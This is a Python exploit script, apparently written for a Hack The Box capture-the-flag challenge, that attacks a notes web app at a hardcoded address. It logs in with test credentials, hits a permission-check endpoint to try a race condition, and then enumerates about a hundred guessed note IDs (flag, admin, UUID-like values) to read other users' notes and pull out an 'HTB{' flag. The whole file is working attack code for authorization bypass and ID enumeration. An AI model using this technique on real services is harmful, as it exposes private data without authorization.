#!/usr/bin/env python3
import requests
import time
import string

BASE_URL = "http://83.136.255.203:47148"

# Login
r = requests.post(f"{BASE_URL}/api/auth/login", 
                 json={"email": "test@test.com", "password": "test123"})
TOKEN = r.json()['token']
headers = {"Authorization": f"Bearer {TOKEN}"}

my_notes = requests.get(f"{BASE_URL}/api/notes", headers=headers).json()['notes']
my_note = my_notes[0]['id']

print(f"[*] My note: {my_note}")

# Generate MANY possible IDs
test_ids = [
    # Common names
    "flag", "FLAG", "Flag", "admin", "Admin", "ADMIN", "root", "ROOT", 
    "system", "SYSTEM", "secret", "SECRET", "password", "PASSWORD",
    "administrator", "ADMINISTRATOR", "htb", "HTB", "hackthebox",
    "challenge", "CHALLENGE", "celestial", "CELESTIAL", "scribe", "SCRIBE",
    
    # Flag-related
    "flag1", "flag2", "flag3", "the-flag", "real-flag", "actual-flag",
    "admin-flag", "root-flag", "system-flag", "secret-flag", "hidden-flag",
    "challenge-flag", "htb-flag", "ctf-flag",
    
    # Hidden/Special
    "hidden", "HIDDEN", ".flag", "_flag", "__flag__", ".hidden", 
    "private", "PRIVATE", "confidential", "classified",
    
    # Numbers
    "0", "1", "2", "3", "4", "5", "admin1", "flag1", "note1",
    
    # App-related
    "welcome", "test", "demo", "sample", "default", "initial",
    "celestial-scribe", "secure-notes", "securenotes",
    
    # Variations
    "FLAG_NOTE", "flag_note", "flagNote", "FlagNote",
    "ADMIN_NOTE", "admin_note", "adminNote", "AdminNote",
    "SECRET_NOTE", "secret_note", "secretNote", "SecretNote"
]

# Add UUID-like variations
for i in range(10):
    test_ids.append(f"00000000-0000-0000-0000-00000000000{i}")
    test_ids.append(f"ffffffff-ffff-ffff-ffff-ffffffffffff{i}")

print(f"[*] Testing {len(test_ids)} potential IDs...")

found_flags = []

for i, target_id in enumerate(test_ids):
    # Try race condition
    requests.get(f"{BASE_URL}/api/notes/{my_note}/check-permission", headers=headers)
    r = requests.get(f"{BASE_URL}/api/notes/{target_id}", headers=headers)
    result = r.json()
    
    if result.get('success'):
        note = result.get('note', {})
        content = note.get('content', '')
        title = note.get('title', '')
        
        print(f"\n[+] Found accessible note: {target_id}")
        print(f"    Title: {title}")
        print(f"    Content: {content}")
        
        if 'HTB{' in content:
            print(f"\n[!!!!!!] REAL FLAG FOUND: {content}")
            found_flags.append(content)
            # Don't break, continue searching for more
    
    if (i + 1) % 20 == 0:
        print(f"  Progress: {i+1}/{len(test_ids)} tested...")
    
    time.sleep(0.03)  # Small delay

print(f"\n[*] Search complete")
if found_flags:
    print(f"[!!!] FLAGS FOUND:")
    for flag in found_flags:
        print(f"  {flag}")
else:
    print("[*] No HTB flags found in these IDs")
